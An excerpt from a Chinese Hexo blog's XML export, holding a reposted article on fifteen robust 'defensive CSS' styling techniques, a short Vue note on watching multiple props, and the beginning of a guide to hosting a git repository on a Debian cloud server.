<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/-webkit-tap-highlight-color">-webkit-tap-highlight-color</a></p>
<p>[2] <a href="https://developer.apple.com/library/mac/documentation/AppleApplications/Reference/SafariWebContent/AdjustingtheTextSize/AdjustingtheTextSize.html#//apple_ref/doc/uid/TP40006510-SW5">Safari 网页内容指南</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>H5</tag>
      </tags>
  </entry>
  <entry>
    <title>项目稳定性治理思考：十五个防御性CSS技能</title>
    <url>/2022/07/02/20220702-%E5%87%A0%E4%B8%AA%E5%AE%9E%E7%94%A8%E7%9A%84-CSS-%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>分享十五个实用的、防御性 CSS 技能。</p>
<p><img src="https://cdn.huatree.top/image-20220703113540863.png" alt="image-20220703113540863"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://mp.weixin.qq.com/s?__biz=MzkyODA5ODg4OA==&mid=2247488899&idx=1&sn=01ad1dde0d63a12ac1fd7b010f5a366b&chksm=c21caaa4f56b23b226145dc0a5e91d479526214b3aaa739df42b3640170685d74e9ae4bcd903&mpshare=1&srcid=0703YxH7a7zrC9G2nJVnoJBs&sharer_sharetime=1656817674425&sharer_shareid=ee63f9cc3c108d8b07d5b171a48e9891&from=singlemessage&scene=1&subscene=10000&clicktime=1656817690&enterid=1656817690&sessionid=0&ascene=1&fasttmpl_type=0&fasttmpl_fullversion=6222624-zh_CN-zip&fasttmpl_flag=0&realreporttime=1656817690306&devicetype=android-31&version=2800183b&nettype=WIFI&abtest_cookie=AAACAA==&lang=zh_CN&exportkey=A44JAsslh6QTRh47qfhHNlA=&pass_ticket=r6uOcYCofI/pAlq8Ls6MSJjk0gcjwuGDE8lh7pUHtIT8YS7sA7UbZanJ7GdzeIfe&wx_header=3">前端进阶指南</a></p>
</div>

<h2 id="一、概念解释"><a href="#一、概念解释" class="headerlink" title="一、概念解释"></a>一、概念解释</h2><p>防御性 CSS，防的是谁？我把他总结为：一切使表现和行为偏离预期效果的情景。出现这些场景的原因是因为终端环境的多样化，开发及测试用例只能覆盖大多数使用场景，在其他环境下，解析机制差异、内容动态变化等，都是导致非预期效果的原因。</p>
<h2 id="二、防御的必要性"><a href="#二、防御的必要性" class="headerlink" title="二、防御的必要性"></a>二、防御的必要性</h2><p>防御性 CSS 不仅仅是为了兼容其他少数场景，避免边界情况，更大的价值在于提升团队协作的可能性。防御性 CSS 的意义类似 JS 中的 try…catch, 他可能无法缩短需求开发的时间，但却是你程序正确运行和稳定运行的最后一道防线，更何况 JS 的错误只有在用户交互后才有感知，而 CSS 一旦出错，直接赤裸裸的展现在用户面前，直接影响用户的使用率和留存率。</p>
<p>都说编程风格分为三种：能跑就行风格、中规中矩风格、锦上添花风格。能跑就行风格代表的是：每一个设定和判断都和当次需求贴合的严丝合缝，如同山羊走钢丝，摇摇欲坠，但就是不倒，不得不令人称奇，但这种风格，不仅对编程人员要求极高，而且十分不利于团队协作，一旦意料意外的情景发生或者需求变更，带来的是雪崩式的改动；中规中矩风格概述为，该写注释的地方写注释，该写思路的地方写自己这么做的理由，该兜底处理的地方做拦截处理，程序的鲁棒性和可维护性直接拉满；万无一失风格更多的像是处女座，追求极致和完美，在中规中矩风格上再增一抹亮色，年轻时候的“雷布斯”就是典型代表。防御性 CSS 的目的就是从技术上尽可能的改变编程者能跑就行的侥幸心理，提升项目的可用性和可维护性。其目的也可以归纳为让你的项目做到：跑起来不出错，改起来不骂人。</p>
<p>防御性 CSS 的作用是对常规 CSS 的兜底，是实现项目稳定性建设重要但极其容易被忽视的一环。</p>
<h2 id="三、防御技能"><a href="#三、防御技能" class="headerlink" title="三、防御技能"></a>三、防御技能</h2><h3 id="技能一：flex-wrap"><a href="#技能一：flex-wrap" class="headerlink" title="技能一：flex-wrap"></a>技能一：flex-wrap</h3><p><strong>属性背景</strong>：flex-wrap 是 flex 布局中的属性，其作用是控制 flex 容器内元素所占空间超出 flex 容器空间时是否折行。</p>
<p><strong>防御原因</strong>：flex-wrap 属性默认是不折行，容易忽略多元素溢出兜底；为兜底，请设置 flex-wrap: wrap;</p>
<p><strong>意外后果</strong>：内部元素被裁剪，或 flex 容器出现滚动条；</p>
<p><strong>应用场景</strong>：</p>
<p>1）开发中 flex 容器空间够用，但小尺寸屏幕会溢出；</p>
<p>2）内容由服务端下发，元素个数无法提前预支，超于预期时导致 flex 容器出现滚动条或内部元素被裁剪；</p>
<p>代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.options-list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703112307377.png" alt="image-20220703112307377"></p>
<h3 id="技能二：margin-间距"><a href="#技能二：margin-间距" class="headerlink" title="技能二：margin 间距"></a>技能二：margin 间距</h3><p><strong>属性背景</strong>：margin 作用是调整元素的外边距。用于指定元素与周围空间的距离关系。</p>
<p><strong>防御原因</strong>：防止元素与元素之间挤压空间，造成重叠等情况；</p>
<p><strong>意外后果</strong>：元素重叠或被挤压；</p>
<p><strong>应用场景</strong>：</p>
<p>1）内容所占空间无法保证与其他元素不存在挤压的场景；</p>
<p>代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.section__title</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703112924176.png" alt="image-20220703112924176"></p>
<h3 id="技能三：长文本处理"><a href="#技能三：长文本处理" class="headerlink" title="技能三：长文本处理"></a>技能三：长文本处理</h3><p><strong>背景</strong>：当文本长度超出容器时，该如何显示。</p>
<p><strong>意外后果</strong>：文本折行，样式不统一；</p>
<p><strong>应用场景</strong>：</p>
<p>1）要求列表表现一致但文本长度不可控；</p>
<p>此处假设与设计最终商定，超出部分以省略显示，那么，意外兜底的样式代码为：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.username</span> &#123;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703112957839.png" alt="image-20220703112957839"></p>
<h3 id="技能四：防止图像被拉伸或压缩"><a href="#技能四：防止图像被拉伸或压缩" class="headerlink" title="技能四：防止图像被拉伸或压缩"></a>技能四：防止图像被拉伸或压缩</h3><p><strong>背景</strong>：通常，服务器下发的图片尺寸以及用户自定义上传的图片，显示在页面时，不可能百分百与容器尺寸贴合，不可避免的会遇到图片的放缩处理。</p>
<p><strong>意外后果</strong>：图像被拉伸或压缩；</p>
<p><strong>应用场景</strong>：</p>
<p>1）服务端下发多种不确定尺寸的图片；</p>
<p>2）用户自定义上传图片且需要预览和编辑；</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.card__thumb</span> &#123;</span><br><span class="line">  <span class="attribute">object-fit</span>: cover;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo 链接：<a href="https://monageju.github.io/Blog/object_fit.html">https://monageju.github.io/Blog/object_fit.html</a></p>
<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703113024894.png" alt="image-20220703113024894"></p>
<h3 id="技能五：锁定滚动链接"><a href="#技能五：锁定滚动链接" class="headerlink" title="技能五：锁定滚动链接"></a>技能五：锁定滚动链接</h3><p><strong>背景</strong>：overscroll-behavior 是 overscroll-behavior-x 和 overscroll-behavior-y 的简写属性，它控制的是元素滚动到边界时的表现。换个能听得懂的说法：在 JS 世界里，有事件冒泡机制，你可以通过 event 的 stopPropagation 方法去阻止冒泡的发生，同样，在 CSS 世界里，滚动也有冒泡机制，当内部元素滚动到边界时，如果继续滚动，会带动外层祖先元素发生滚动，这种现象被称为滚动链，为了方便记忆，你也可以把他形象的记忆为滚动冒泡。而 overscroll-behavior 这个属性，就是类似 event 的 stopPropagation 方法阻止冒泡事件一样，提供给开发者去控制内层元素是否可以发生”冒泡“带动外层元素滚动的属性。</p>
<p><strong>意外后果</strong>：”滚动冒泡“ 或 ”滚动穿透“；</p>
<p><strong>应用场景</strong>：</p>
<p>1）页面存在多层滚动元素，需要单独控制每层滚动是否引起外层滚动；</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.child</span> &#123;</span><br><span class="line">  overscroll-behavior-y: contain;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo 链接：<a href="https://monageju.github.io/Blog/overscroll_behavior.html">https://monageju.github.io/Blog/overscroll_behavior.html</a></p>
<p>场景示例：如 demo 链接示例</p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>理解了 overscroll-behavior 属性的作用，现在我们来看点拓展的东西：</p>
<p>首先来看下 overscroll-behavior 的属性值有哪些：</p>
<h5 id="overscroll-behavior-属性有-3-个值"><a href="#overscroll-behavior-属性有-3-个值" class="headerlink" title="overscroll-behavior 属性有 3 个值"></a>overscroll-behavior 属性有 3 个值</h5><p>auto - 默认。元素的滚动会传播给祖先元素。</p>
<p>contain - 阻止滚动链接。滚动不会传播给祖先，但会显示元素内的原生效果。例如，Android 上的炫光效果或 iOS 上的回弹效果，当用户触摸滚动边界时会通知用户。注意：overscroll-behavior: contain 在 html 元素上使用可防止滚动导航操作。</p>
<p>none - 和 contain 一样，但它也可以防止节点本身的滚动效果（例如 Android 炫光或 iOS 回弹）。</p>
<p>这里有两个效果：一是下拉刷新，二是炫光回弹，这里有个 demo 可以看到具体效果：链接传送门</p>
<p>下拉刷新是原生支持的功能，如果项目要求自定义下拉刷新效果，除了要考虑如何实现自定义，还要考虑如何去掉默认原生下拉刷新，否则就会出现两个并存的下拉刷新，而去掉原生的下拉刷新也很简单，只需要在 body 或 html 元素添加如下代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="comment">/* 禁用滚动冒泡,但是依然可以进行下拉刷新和炫光和回弹效果以及滑动导航 */</span></span><br><span class="line">  overscroll-behavior-y: contain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于禁用炫光和回弹效果，其实是应用 overscroll-behavior 属性的 none 属性值，具体代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="comment">/* 禁用默认的下拉刷新和炫光和回弹效果,但是依然可以进行滑动导航 */</span></span><br><span class="line">  overscroll-behavior-y: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了上述描述的两个效果，其实还有一个效果：手势导航,如左滑退出及右滑前进功能；而如果要禁用手势导航，可以使用如下代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="comment">/* 禁用滑动导航 */</span></span><br><span class="line">  overscroll-behavior-x: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="技能六：CSS-变量默认值"><a href="#技能六：CSS-变量默认值" class="headerlink" title="技能六：CSS 变量默认值"></a>技能六：CSS 变量默认值</h3><p><strong>背景</strong>：CSS 变量可以实现动态控制元素属性，但是当 CSS 变量未定义或无效时，造成变量值异常，此时，元素的样式将会脱离预期，而变量默认值可以实现异常兜底，保证变量值异常时页面依然能运行。需要额外说明的是，备用值并不是用于实现浏览器兼容性的。如果浏览器不支持 CSS 自定义属性，备用值也没什么用。它仅对支持 CSS 自定义属性的浏览器提供了一个备份机制，该机制仅当给定值未定义或是无效值的时候生效，函数的第一个参数是自定义属性的名称。如果提供了第二个参数，则表示备用值，当自定义属性值无效时生效。</p>
<p><strong>意外后果</strong>：因失去宽高等变量值而不显示或变形；</p>
<p><strong>应用场景</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--my-var, red); <span class="comment">/* Red if --my-var is not defined */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="技能七：弹性元素尺寸-min-height-x2F-min-width"><a href="#技能七：弹性元素尺寸-min-height-x2F-min-width" class="headerlink" title="技能七：弹性元素尺寸 min-height &#x2F; min-width"></a>技能七：弹性元素尺寸 min-height &#x2F; min-width</h3><p><strong>背景</strong>：当需求要求完整展示某个列表数据，但列表数据所占空间无法固定时，为避免部分内容过宽、过高突破固定空间破坏布局，可以使用弹性尺寸 <code>min-_</code> 或者 <code>max-_</code> , 这样能自动适应部分内容所占空间过大或过小带来的样式美观问题；</p>
<p><strong>意外后果</strong>：占用空间过大或过小，破坏布局或不美观；</p>
<p><strong>应用场景</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hero</span> &#123;</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">350px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703113103762.png" alt="image-20220703113103762"></p>
<p>max-width 的使用场景：</p>
<p>如果对每一个元素使用固定的 width,则当内容空间大于容器尺寸时，将发生溢出，此时，需要使用 min-width 限制最小宽度，当超出尺寸时，能够实现自动适配。</p>
<h3 id="技能八：被遗忘的-background-repeat"><a href="#技能八：被遗忘的-background-repeat" class="headerlink" title="技能八：被遗忘的 background-repeat"></a>技能八：被遗忘的 background-repeat</h3><p><strong>背景</strong>：使用图片作为容器的背景图，当容器的尺寸大于图片尺寸时，默认背景图会重复，如果你在开发中忽略了上述问题，则会出现背景图重复的问题；</p>
<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703113126092.png" alt="image-20220703113126092"></p>
<p><strong>解决办法</strong>：</p>
<p>代码如下 ：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="attribute">background-repeat</span>: no-repeat;</span><br></pre></td></tr></table></figure>

<p><strong>解决后效果：</strong></p>
<p><img src="https://cdn.huatree.top/image-20220703113153598.png" alt="image-20220703113153598"></p>
<h3 id="技能九：媒体查询-media"><a href="#技能九：媒体查询-media" class="headerlink" title="技能九：媒体查询 @media"></a>技能九：媒体查询 @media</h3><p><strong>背景</strong>：媒体查询的使用更像是 CSS 中的条件判断，它会根据你定义的条件，当条件满足时，条件内的样式生效；</p>
<p><strong>举例</strong>：当屏幕的宽度小于 600px 时，body 背景色为红色；当屏幕宽度介于 600-800px 之间时，body 背景色为黄色；当屏幕宽度大于 800px 时，body 的背景色为蓝色；</p>
<p><strong>示例代码</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 将 body 的背景色设置为蓝色 */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在小于或等于 800 像素的屏幕上，将背景色设置为黄色 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">800px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在 600 像素或更小的屏幕上，将背景色设置为红色 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">600px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo 链接如下：<a href="https://monageju.github.io/Blog/media.html">https://monageju.github.io/Blog/media.html</a></p>
<h3 id="技能十：图片上的文字"><a href="#技能十：图片上的文字" class="headerlink" title="技能十：图片上的文字"></a>技能十：图片上的文字</h3><p><strong>背景</strong>：当需要在图片上层展示文字时，如果图片加载失败，而外层容器的背景色和文字颜色接近，那么文字的展示效果就不理想；</p>
<p><strong>举例</strong>：容器背景设置为黑色，图片为橙色，文字颜色为近黑色，当图片加载失败时，文字的背景色直接变为容器的背景色，文字与容器背景色重合，示例如下；</p>
<p><strong>解决后效果：</strong></p>
<p><img src="https://cdn.huatree.top/image-20220703113215229.png" alt="image-20220703113215229"></p>
<p><strong>解决代码：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.card__img</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，即使图片加载失败，图片上的问题依然可以正常显示；至于图片加载失败时左上角的“破图”标记，可以使用伪类进行遮挡美化；</p>
<h3 id="技能十一：合理使用滚动条属性"><a href="#技能十一：合理使用滚动条属性" class="headerlink" title="技能十一：合理使用滚动条属性"></a>技能十一：合理使用滚动条属性</h3><p><strong>背景</strong>：当容器的空间固定时，如果内容超出容器，为正常显示完所有内容，同时不扩展所占空间，会使用 overflow 属性控制超出部分自动滚动展示，同时给与滚动条样式提示有剩余内容，但如果该属性使用不当，会造成样式很难看；</p>
<p><strong>举例</strong>：overflow 属性有两个作用很相近的属性值，一个是 scroll, 另一个是 auto; 这两个属性值都能实现当内容大于所占空间时滚动展示，不同点在于使用 scroll 属性无论内容是否超出容器空间，都会展示滚动条，而 auto 属性会分辩条件，内容超出时才会展示滚动条，为超出时则会自动隐藏，样式上较为美观；</p>
<p><strong>解决代码：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>场景示例：</p>
<p><img src="https://cdn.huatree.top/image-20220703113233112.png" alt="image-20220703113233112"></p>
<h3 id="技能十二：预留滚动条空间，避免重排"><a href="#技能十二：预留滚动条空间，避免重排" class="headerlink" title="技能十二：预留滚动条空间，避免重排"></a>技能十二：预留滚动条空间，避免重排</h3><p><strong>背景</strong>：接技能十一，当我们正确使用了 overflow:auto 就万事大吉了吗？也不尽然。</p>
<p>设想这样一个场景：有一个宽度 100vw，高度为 100vh 的容器盒子，容器内展示商品卡片，滑动到页面底部时，触发滑动加载，当触发懒加载时，容器内商品卡片占用的高度已经超出 100vh，依据外层容器设置的 overflow:auto，内容超出时会展示滚动条，滚动条的出现，使得页面不得不给滚动条让出一定的宽度，这个切换的场景中，由于不得不给滚动条让位置，最外层的元素发生了元素宽度变化，产生了重排的效果，有没有可能避免这一次不必要的重排呢？答案是有的。</p>
<p>大家一定还记得 vue 的指令中有两个很相像的指令 v-if 和 v-show, 他们俩的原理和区别是什么？分别用在什么情景下？提醒到这，是不是有思路了？如果还没有，那也没关系，再提示一点点，既然要避免多余的一次重排，而滑动加载又不可避免，如果我一开始就预留好滚动条的位置，只是你看不见，到了滚动条应该出场的时候再让你看见，是不是就能避免不必要的重排了呢？现在再想想，这是不是就是 v-show 指令的设计原理？</p>
<p>CSS 中有一个 scrollbar-gutter 属性，当它的值设置为 stable 时，就能够实现上述的这种功能，代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">scrollbar-gutter</span>: stable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong>：</p>
<p>内容较短时预留滚动条空间，内容超出时显示滚动条；</p>
<p><img src="C:\Users\yuhua\AppData\Roaming\Typora\typora-user-images\image-20220703113258300.png" alt="image-20220703113258300"></p>
<h3 id="技能十三：图片最大宽度"><a href="#技能十三：图片最大宽度" class="headerlink" title="技能十三：图片最大宽度"></a>技能十三：图片最大宽度</h3><p><strong>背景</strong>：当给固定宽高容器设置背景图时，如果背景图尺寸超过容器宽高，图片会溢出，因此，最好在项目的 resetCss 中按照以下属性属性初始化：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">object-fit</span>: cover;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>实例：</strong></p>
<p><img src="https://cdn.huatree.top/image-20220703113319483.png" alt="image-20220703113319483"></p>
<h3 id="技能十四：粘性定位"><a href="#技能十四：粘性定位" class="headerlink" title="技能十四：粘性定位"></a>技能十四：粘性定位</h3><p><strong>说明</strong>：position 的粘性定位指的是通过用户的滚动，元素的 position 属性在 position:relative 与 position:fixed 定位之间切换；这对于需要使用滚动吸顶的场景非常方便；是典型的依据业务场景推动 CSS 技术发展的典例；</p>
<h3 id="技能十五：浏览器兼容性-CSS-请勿批量处理"><a href="#技能十五：浏览器兼容性-CSS-请勿批量处理" class="headerlink" title="技能十五：浏览器兼容性 CSS 请勿批量处理"></a>技能十五：浏览器兼容性 CSS 请勿批量处理</h3><p><strong>说明</strong>：根据 W3C 标准，批量分组选择选择器，如果分组中，其中一个无效，那么整个选择器都将会失效。因此，在遇到浏览器兼容属性时，切勿批量组合书写；</p>
<p><strong>实例:</strong></p>
<p>如果是如下书写方式，则该选择器没有任何问题，因为该分组选择器的所有选择器都有效：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-tag">h3</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，它的作用等同于：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h2</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h3</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但如果，是下面这种情况就不同了：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder,</span><br><span class="line">input:-moz-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该选择器使用了分组选择器，在确定的某一个浏览器中，该分组中只有一个选择器有效，而其他选择都是失效状态，根据规则，整个分组选择器都将会失效，因此，正确的做法应该是分开写，代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span>:-moz-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，其效果才是符合预期的。</p>
<h2 id="四、结语"><a href="#四、结语" class="headerlink" title="四、结语"></a>四、结语</h2><p>通常一个项目的稳定性指的都是逻辑层稳定和服务层稳定，CSS 是极其容易被忽视的一层；当项目发生线上故障时，逻辑层和服务器可以通过日志查询、抓包等手段定位，而 CSS 问题则只能凭借经验和项目所运行环境进行大致推断，极难快速准确定位问题。在稳定性建设时，CSS 的书写应该遵循“瞻前顾后”的防御性写法，尽可能的避免意外的边界情况，这才是防御性 CSS 的真实价值。</p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中一次性监听多个data值</title>
    <url>/2022/08/01/20220801-Vue%E4%B8%AD%E4%B8%80%E6%AC%A1%E6%80%A7%E7%9B%91%E5%90%AC%E5%A4%9A%E4%B8%AAdata%E5%80%BC/</url>
    <content><![CDATA[<p>Vue 子组件依赖 props，父组件多个异步请求的 data 通过 props 传入子组件，子组件组要监听 props 的值是否存在作为下一步需求代码的执行条件，此时，就需要一次性监听多个 data 值了。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>computed 和 watch 连用，watch 监听 computed 的属性。</p>
<p>利用 computed 属性依赖变化会导致重新计算的机制可以更加优雅的实现同时监听多个属性变化的效果，而且由于 computed 是有缓存机制的，性能上也更具优势。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;...&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;ChrildComp&#x27;</span><br><span class="line">  props: &#123;</span><br><span class="line">    orderDetail: &#123;</span><br><span class="line">      type: Object,</span><br><span class="line">      default: () =&gt; &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    userInfo: &#123;</span><br><span class="line">      type: Object,</span><br><span class="line">      default: () =&gt; &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    changeData() &#123;</span><br><span class="line">      const &#123; orderDetail, userInfo &#125; = this</span><br><span class="line">      return &#123;</span><br><span class="line">        orderDetail,</span><br><span class="line">        userInfo</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    changeData: function (newV) &#123;</span><br><span class="line">      const &#123; orderDetail, userInfo &#125; = newV</span><br><span class="line">      if (Object.prototype.toString.call(orderDetail) === &#x27;[object Object]&#x27; &amp;&amp; Object.keys(orderDetail).length &gt; 0) &#123;</span><br><span class="line">        console.log(&#x27;changeData&#x27;, orderDetail, userInfo)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器搭建git仓库</title>
    <url>/2022/08/22/20220822-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAgit%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p>在实际的开发中，都是一个团队协同开发，共享代码资源。那么就需要服务器来存放团队的代码，需要用的时候从服务器下载。首先找一台电脑充当服务器的角色，每天 24 小时开机，其他每个人都从这个“服务器”仓库克隆一份到自己的电脑上，并且各自把各自的提交推送到服务器仓库里，也从服务器仓库中拉取别人的提交。可以自己搭建这台服务器，也可以使用 GitHub、Gitee 等作为 Git 服务器。</p>
<p><img src="https://cdn.huatree.top/image-20220825071410475.png" alt="image-20220825071410475"></p>
<span id="more"></span>

<div class="note primary"><p>本文以百度智能云服务器<code>debian</code>为例，root 角色进行操作。</p>
</div>

<h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt update</span><br><span class="line">$ apt upgrage</span><br><span class="line">$ apt install git</span><br><span class="line"><span class="comment"># 检查版本，确认安装成功</span></span><br><span class="line">$ git --version</span><br></pre></td></tr></table></figure>

<p>创建用户组和用户，用于运行 Git 服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加用户组</span></span><br><span class="line">$ groupadd git</span><br><span class="line"><span class="comment"># 添加用户到这个用户组（git仓库的所有者）</span></span><br><span class="line">$ useradd -g git git</span><br><span class="line"><span class="comment"># 给git用户设置密码</span></span><br><span class="line">$ passwd git</span><br><span class="line">Changing password <span class="keyword">for</span> user git.</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br></pre></td></tr></table></figure>

<h2 id="初始化-Git-仓库"><a href="#初始化-Git-仓库" class="headerlink" title="初始化 Git 仓库"></a>初始化 Git 仓库</h2><p>选定一个目录作为 Git 仓库，如&#x2F;home&#x2F;gitRepo&#x2F;demo.git，在&#x2F;home&#x2F;gitRepo 目录下输入命令</p>
